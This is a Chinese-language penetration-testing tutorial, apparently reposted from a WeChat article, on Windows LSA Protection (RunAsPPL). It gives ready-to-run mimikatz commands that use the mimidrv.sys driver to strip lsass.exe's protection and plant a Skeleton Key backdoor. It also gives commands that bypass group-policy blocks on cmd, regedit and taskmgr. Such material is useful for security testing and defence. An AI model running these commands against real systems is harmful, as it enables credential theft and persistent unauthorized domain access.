# 域渗透-LSA Protection

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyNTk1NDQ3Ng==&mid=2247484765&idx=1&sn=0681e54b7df11d79a92feeacf3ff5381&chksm=fa17799ecd60f0881ec75bce86315f430e79defaa65c94b464e1242b4f22797fa9f871087b9e&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzUyNTk1NDQ3Ng==&mid=2247484765&idx=1&sn=0681e54b7df11d79a92feeacf3ff5381&chksm=fa17799ecd60f0881ec75bce86315f430e79defaa65c94b464e1242b4f22797fa9f871087b9e&scene=27#wechat_redirect)

简介：

微软在 2014 年 3 月 12 日添加了 LSA 保护策略，用来防止对进程 lsass.exe 的代码注入，这样一来就无法使用 mimikatz 对 lsass.exe 进行注入，相关操作也会失败。

微软官方文档：https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)

适用系统：

Windows 8.1

Windows Server 2012 R2

接下来换用 Windows Server 2012 R2 进行测试

（1）配置 LSA Protection

注册表位置：

HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa

![](../Images/ea61657df7a733926eeb940df9c133c3.png)

新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，重启系统生效。

![](../Images/490d5329468d06438702c03e61815a6b.png)

（2）测试 Skeleton Key

mimikatz 命令：

privilege::debug

misc::skeleton

未配置LSA Protection时不会报错。

![](../Images/49713ca885aa0316f6f3de3c662e2de6.png)

配置LSA Protection时失败报错：

![](../Images/b5628abfdd0a81270e30f0b7bb4c4dd3.png)

（3）绕过 LSA Protection

mimikatz 早在 2013 年 10 月就已支持绕过 LSA Protection

注：该功能需要 mimidrv.sys 文件

![](../Images/2cd5284da67b745b57f9d4fb93107323.png)

mimikatz 命令：

privilege::debug

!+

!processprotect /process:lsass.exe /remove

misc::skeleton

如图，导入驱动文件mimidrv.sys后，绕过 LSA Protection，操作成功

![](../Images/d308b166a77b1998c9fa64a27866f5f8.png)

关闭LSA Protection，将RunAsPPL的值改为0重启计算机即可。

![](../Images/2c837d995e35bb7a7d6b9a8760737341.png)

补充:

一些常见问题的解决方法，管理员常常会禁用一些重要程序的运行，比如 cmd、regedit、taskmgr等

1、如何禁用 cmd、regedit、taskmgr

输入 gpedit.msc 进入本地组策略编辑器

本地计算机策略-用户配置-管理模板-系统

![](../Images/34b41f42bc49f99580089078033b2414.png)

禁用 cmd：

选择”阻止访问命令提示符”-编辑—启用

![](../Images/e3619b947fb51f984af2572dadccab38.png)

阻止命令提示符启用。

![](../Images/a0094db25f81817334363acae980fd30.png)

测试：命令提示符已被管理员停用。

![](../Images/dbd58472af68e68018fe363e839cebe5.png)

禁用 regedit：

选择阻止访问注册表编辑工具”-编辑-启用

![](../Images/09e67b1aa83d908f69a85614b6dbb766.png)

禁用 Windows 注册表编辑器 Regedit.exe。

![](../Images/c766af5669faa369ff5ffb9f792549cb.png)

测试：注册表编辑器已被管理员禁用。

![](../Images/35e004ecd1d1c5dcb5dfb39c381c2c09.png)

禁用 taskmgr:

选择”不要运行指定的 Windows 应用程序”-不允许的应用程序列表-填入 taskmgr.exe-启用。

![](../Images/cfe1b97a36492d2a3f4113625bb6aa64.png)

防止 Windows 运行在此设置中指定的程序。

![](../Images/4d65a12981184863c44e814a2249ac9c.png)

测试：用户无法运行已添加到不允许的应用程序列表的程序。

![](../Images/25a8051654f8bb84846e76a289ac365b.png)

经测试 cmd、regedit、taskmgr 均已被禁用。

2、绕过

mimikatz 命令：

privilege::debug

misc::cmd

misc::regedit

misc::taskmgr

![](../Images/1bbed1dad8696cc8c2998ba92f1c68ed.png)

![](../Images/ffb88490a4064dd9e2d16b15effb69fe.png)

![](../Images/637d1349aaf3ca51c319e52f361120c2.png)

成功执行，绕过限制。
